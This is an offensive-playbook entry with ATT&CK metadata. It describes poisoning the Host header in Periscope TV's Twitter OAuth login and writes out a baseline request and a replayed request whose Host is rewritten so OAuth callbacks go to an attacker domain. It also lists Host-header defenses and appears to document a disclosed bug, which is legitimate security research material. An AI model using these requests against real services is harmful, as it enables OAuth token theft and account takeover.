---
id: proc-periscope-oauth-poison-init
tags:
  - host-header-poisoning
  - oauth
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/original-oauth-login-request]]'
  - '[[commands/poisoned-host-header-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:34.246Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Initiate-and-Poison-Host-Header-in-OAuth-Request

## Summary

This procedure initiates the Twitter OAuth login on Periscope TV and poisons the Host header to manipulate the redirect URI, setting up the attack for token capture.

## Description

The Periscope TV login flow uses the unvalidated Host header to build OAuth redirect URIs. By modifying the Host to an attacker-controlled domain prefixed with the original (e.g., attacker.com/original.com), the server redirects OAuth callbacks to the attacker. This targets the /i/twitter/login endpoint and requires a proxy for interception. Prerequisites include access to Periscope TV and an attacker domain.

## Requirements

1. Proxy tool like Burp Suite for request interception
2. Attacker-controlled domain (e.g., example.com)
3. Valid CSRF token from initial visit to Periscope TV

## Defense

Defensive measures and detection strategies:

- Validate and sanitize Host headers against a whitelist of allowed domains
- Use absolute URLs for OAuth redirects instead of relying on Host
- Monitor for anomalous Host headers in logs and block prefixed domains

## Objectives

1. Trigger OAuth flow and obtain CSRF token
2. Inject poisoned Host to alter callback domain
3. Receive response with manipulated redirect

## Instructions

### Step 1: Initiate Original Login Request

**Context**: Start the OAuth process to get the baseline request and CSRF token.

**Command** ([[commands/original-oauth-login-request]]):
```http
GET /i/twitter/login?csrf=████ HTTP/1.1
Host: www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
Cookie: ...
```

> This sends the initial request; expected output is HTML starting the OAuth flow. Capture the CSRF token.

### Step 2: Modify and Replay with Poisoned Host

**Context**: Alter the Host header to poison the domain in the constructed redirect.

**Command** ([[commands/poisoned-host-header-request]]):
```http
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
Cookie: ...
```

> Server builds redirect using poisoned Host; expected output is HTML with meta refresh to Twitter OAuth.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/original-oauth-login-request]]
- [[commands/poisoned-host-header-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- host-header-poisoning
- oauth
